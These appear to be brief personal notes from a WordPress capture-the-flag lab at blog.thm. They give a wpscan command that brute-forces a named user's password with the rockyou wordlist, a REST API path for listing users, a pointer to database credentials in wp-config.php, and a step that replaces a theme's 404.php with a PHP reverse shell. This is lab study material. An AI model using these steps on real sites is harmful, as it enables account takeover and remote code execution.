# Info 
Popular Blog CMS

check website location (`/var/www/html/wordpress`) for config file for database login information. `wp-config.php` 

---

# wpscan

Find Users with built in API
```txt
http://blog.thm/wp-json/wp/v2/users
```


bruteforce login
```bash
wpscan --url http://blog.thm --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt
```


Appearance > Edit > Themes
1. 404.php
2. replace with php reverse shell

